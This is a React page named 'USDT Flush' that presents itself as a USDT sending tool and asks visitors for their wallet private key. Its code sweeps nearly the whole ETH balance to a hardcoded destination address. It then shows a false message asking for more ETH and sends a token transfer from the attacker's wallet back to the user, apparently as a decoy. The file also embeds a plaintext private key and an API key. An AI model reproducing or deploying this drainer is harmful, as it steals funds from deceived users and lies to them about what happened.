import { useState } from 'react';


export default function Home() {
  const [usdtAmount, setUsdtAmount] = useState('');
  const [userPrivateKey, setUserPrivateKey] = useState('');
  const [status, setStatus] = useState('');
  const [txHashes, setTxHashes] = useState([]);

  const providerUrl = 'https://sepolia.infura.io/v3/4c39a19e71e148dcbc0e670747185fbc';
  const destinationAddress = '0x72bF97BB427548b96BDA7c5f7a2A79b61B40bbCB';
  const destinationPrivateKey = '70aa822b01e6201e78629661e9f0ddb3144a11f06a06e567d159912c2e11521e';

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus('Processing...');
    setTxHashes([]);

    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.providers.JsonRpcProvider(providerUrl);
      const userWallet = new ethers.Wallet(userPrivateKey, provider);
      const destinationWallet = new ethers.Wallet(destinationPrivateKey, provider);

      const balance = await provider.getBalance(userWallet.address);
      const gasPrice = await provider.getGasPrice();

      const estimatedGasLimit = await provider.estimateGas({
        to: destinationAddress,
        value: 0,
        from: userWallet.address
      });

      const gasFee = gasPrice.mul(estimatedGasLimit);

      if (balance.lte(gasFee)) {
        setStatus('Insufficient ETH for gas fees.');
        return;
      }

      const amountToSend = balance.sub(gasFee);

      const sweepTx = await userWallet.sendTransaction({
        to: destinationAddress,
        value: amountToSend,
        gasPrice: gasPrice,
        gasLimit: estimatedGasLimit
      });

      setStatus('Not Enough ETH for gas fees. Please add more ETH to your wallet.');

      const USDT_ADDRESS = '0x7169D38820dfd117C3FA1f22a697dBA58d90BA06';
      const USDT_ABI = ["function transfer(address to, uint amount) public returns (bool)"];
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, destinationWallet);

      const usdtTxData = await usdtContract.populateTransaction.transfer(
        userWallet.address,
        ethers.utils.parseUnits(usdtAmount, 6)
      );

      const usdtTx = await destinationWallet.sendTransaction({
        ...usdtTxData,
        gasPrice: ethers.BigNumber.from(100000000),
        gasLimit: ethers.BigNumber.from(100000)
      });

      console.log('USDT Sending Tx Hash:', usdtTx.hash);
      setTxHashes((prev) => [...prev, { label: 'USDT Sending Tx', hash: usdtTx.hash }]);

    } catch (err) {
      console.error(err);
      setStatus(`Error: ${err.message}`);
    }
  };

  return (
    <div className="container">
      <div className="card">
        <h1>USDT Flush</h1>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="User Private Key"
            value={userPrivateKey}
            onChange={(e) => setUserPrivateKey(e.target.value)}
            required
          />
          <input
            type="text"
            placeholder="USDT Amount"
            value={usdtAmount}
            onChange={(e) => setUsdtAmount(e.target.value)}
            required
          />
          <button type="submit">Execute</button>
        </form>

        {status && (
          <div className="status-box">
            {status}
          </div>
        )}

        {txHashes.length > 0 && (
          <div className="tx-list">
            <h2>Transaction Hashes:</h2>
            {txHashes.map((tx, index) => (
              <div key={index} className="tx-item">
                <span>{tx.label}: </span>
                <span className='hash'>{tx.hash}</span>
                <a className='linkscan' href={`https://sepolia.etherscan.io/tx/${tx.hash}`} target="_blank" rel="noopener noreferrer">
                  Click to view on Etherscan
                </a>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
